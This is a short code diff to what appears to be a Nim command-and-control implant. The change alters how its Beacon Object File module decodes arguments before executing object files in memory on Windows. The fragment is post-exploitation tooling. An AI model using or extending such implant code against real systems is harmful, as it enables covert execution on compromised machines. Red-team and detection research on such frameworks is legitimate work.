@@ -1,5 +1,5 @@
 import winim/lean
-import tables, strformat, strutils
+import tables, strformat, strutils, base64
 import ../../common/[types, utils]
 import ../utils/io
 import ../protocol/result
@@ -184,17 +184,15 @@ when ((MODULES and cast[uint32](MODULE_BOF)) == cast[uint32](MODULE_BOF)):
                 arguments = @[]
             else: # Parameters were passed to the BOF execution
                 objectFile = task.args[0].data
+                arguments = string.toBytes(base64.decode(Bytes.toString(task.args[1].data)))
 
-                # Combine the passed arguments into a format that is understood by the Beacon API
-                arguments = generateCoffArguments(task.args[1..^1])
-            
             # Unpacking object file, since it contains the file name too.
             var unpacker = Unpacker.init(Bytes.toString(objectFile))
             let 
                 fileName = unpacker.getDataWithLengthPrefix()
                 objectFileContents = unpacker.getDataWithLengthPrefix()
 
-            print fmt"   [>] Executing object file {fileName}."
+            print fmt"   [>] Executing object file {fileName}." 
             let output = inlineExecuteGetOutput(string.toBytes(objectFileContents), arguments)
 
             if output != "":
